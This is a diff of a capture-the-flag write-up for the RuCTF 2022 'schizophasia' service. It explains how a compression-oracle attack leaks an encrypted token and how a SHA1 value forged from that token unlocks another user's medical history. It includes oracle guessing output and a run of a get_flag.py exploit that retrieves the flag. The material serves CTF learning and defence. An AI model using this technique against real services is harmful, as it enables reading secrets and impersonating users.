@@ -1,10 +1,10 @@
-### RuCTF 2022 | schizophasia 
+### RuCTF 2022 | schizophasia
 
 # Description
 
-Service forwards your question to a doctor who can easily answer any question. The only problem that it seems like the doctor speaks some nonsense. 
+Service forwards your question to a doctor who can easily answer any question. The only problem that it seems like the doctor speaks some nonsense.
 
-Service consists of two parts: registry and doctor. 
+Service consists of two parts: registry and doctor.
 
 ## Doctor (GoLang)
 
@@ -26,7 +26,7 @@ Here is the sample service communication flow:
 1. Client sends a query to registry:
 `SELECT add_job(QUESTION, USER_ID)`, where `QUESTION` and `USER_ID` are provided by the client.
 
-2. Registry looks up the current `TOKEN`. Registry generates a new `TOKEN` every 15 minutes. Each `TOKEN` has a lifetime of 30 minutes. 
+2. Registry looks up the current `TOKEN`. Registry generates a new `TOKEN` every 15 minutes. Each `TOKEN` has a lifetime of 30 minutes.
 
 3. Registry crafts the following metadata:
 ```json
@@ -61,7 +61,13 @@ curl --location --request PUT 'http://127.0.0.1:18181/api/v1/jobs' \
 {"code":200,"msg":"ok","data":"90E84150E952B3976A98CF5990629BCB5FD017BF"}
 ```
 
-8. Client uses the token to format a medical history lookup request to the registry. To verify the client's request, the registry also computes the SHA1 sum of "USER_ID"+"TOKEN" and checks if it matches the provided one.
+8. Also, the doctor updates the registry medical history entry with the answer for the provided question:
+
+```
+SELECT finish_job(TOKEN, QUESTION, USER_ID, ANSWER)
+```
+
+9. Client uses the token to format a medical history lookup request to the registry. To verify the client's request, the registry also computes the SHA1 sum of "USER_ID"+"TOKEN" and checks if it matches the provided one.
 
 ```
 postgres=# SELECT * FROM medical_history('USER_ID', '90E84150E952B3976A98CF5990629BCB5FD017BF') limit 1;
@@ -71,10 +77,10 @@ postgres=# SELECT * FROM medical_history('USER_ID', '90E84150E952B3976A98CF59906
 (1 row)
 ```
 
-# Solution
+# Attack
 
 ## Overview
-The solution is pretty straightforward. If you look closer at steps 1-5, you can notice that the client is able to inject arbitrary data into the contents of the compressed & encrypted metadata and observe its size. It allows the attacker (client) to exploit the "compression oracle" vulnerability. 
+The solution is pretty straightforward. If you look closer at steps 1-5, you can notice that the client is able to inject arbitrary data into the contents of the compressed & encrypted metadata and observe its size. It allows the attacker (client) to exploit the "compression oracle" vulnerability.
 
 By utilizing the compression oracle attack, the client is able to read the contents of the encrypted metadata (including the TOKEN) from the registry (step 5). The client can now compute the SHA1 hash with any USER_ID (received from the check system) and pass it to the registry service to read the medical history entry.
 
@@ -93,9 +99,9 @@ current letter: F, len: 192
 current letter: G, len: 192
 current letter: H, len: 192
 current letter: I, len: 192
-current letter: J, len: 160
+current letter: J, len: 192
 current letter: K, len: 192
-current letter: L, len: 192
+current letter: L, len: 160
 current letter: M, len: 192
 current letter: N, len: 192
 current letter: O, len: 192
@@ -110,32 +116,33 @@ current letter: W, len: 192
 current letter: X, len: 192
 current letter: Y, len: 192
 current letter: Z, len: 192
-INITIAL LENGTHS: [(160, 'J')]
+INITIAL LENGTHS: [(160, 'L')]
 
 # on the next step, choose the entry with the smallest metadata length
 
-current guess: JE, len: 160
-current guess: JEA, len: 160
-current guess: JEAC, len: 160
-current guess: JEACC, len: 160
-current guess: JEACL, len: 160
-current guess: JEACLM, len: 160
-current guess: JEACLW, len: 160
-current guess: JEACLMW, len: 160
-current guess: JEACLMWC, len: 160
-current guess: JEACLMWCP, len: 160
-current guess: JEACLMWCPO, len: 160
-[[[[[('failed', 9999999999999), [[[[[('JEACLMWCPO', 160)]]]], ('failed', 9999999999999)]]]]]]
+current guess: LY, len: 160
+current guess: LYG, len: 160
+current guess: LYGU, len: 160
+current guess: LYGUR, len: 160
+current guess: LYGURO, len: 160
+current guess: LYGUROU, len: 160
+current guess: LYGUROUO, len: 160
+current guess: LYGUROUOI, len: 160
+current guess: LYGUROUOIF, len: 160
+current guess: LYGUROUOIJ, len: 160
+current guess: LYGUROUOIR, len: 160
+[[[[[[[[[[('LYGUROUOIF', 160), ('LYGUROUOIJ', 160), ('LYGUROUOIR', 160)]]]]]]]]]]
 ```
 
 ### Get flag
 ```
-~/ructf-2022/sploits/schizophasia$ ./get_flag.py 127.0.0.1 user_9024abda-2635-4fcd-a0fc-8dbce7f76414 JEACLMWCPO
-SHA1: 99EDDB333C6C1E53B1976FA47B1044E2C2E44B51
-SELECT * FROM medical_history('user_9024abda-2635-4fcd-a0fc-8dbce7f76414', '99EDDB333C6C1E53B1976FA47B1044E2C2E44B51')
+~/ructf-2022/sploits/schizophasia$ ./get_flag.py 127.0.0.1 user_361fe807-f003-44f9-9338-2ca69c223ff4 LYGUROUOIR
+SHA1('user_361fe807-f003-44f9-9338-2ca69c223ff4LYGUROUOIR'): E77BC343618D5D6E4F5B00B36CF23EED36AA6856
+SELECT * FROM medical_history('user_361fe807-f003-44f9-9338-2ca69c223ff4', 'E77BC343618D5D6E4F5B00B36CF23EED36AA6856')
 
-Q: UGIF3IC9SSAOJZQO5RFJISHUEHAPL5O=, U: user_9024abda-2635-4fcd-a0fc-8dbce7f76414, S: True, R: lack of in-house expertise can amplify these costs But organizations with a comprehensive cybersecurity strategy governed by best practices and automated using advanced analytics artificial intelligence and machine learning can fight cyberthreats more effectively and reduce the lifecycle and impact of breaches when they occur
+Question: LS0O22K9GDQW6832WXEXE7HIUXQGTSJ=
+User: user_361fe807-f003-44f9-9338-2ca69c223ff4
+Status: True
+Answer: intelligence and machine learning can fight cyberthreats more effectively and reduce the lifecycle and impact of breaches when they occur
 ```
-
-
 
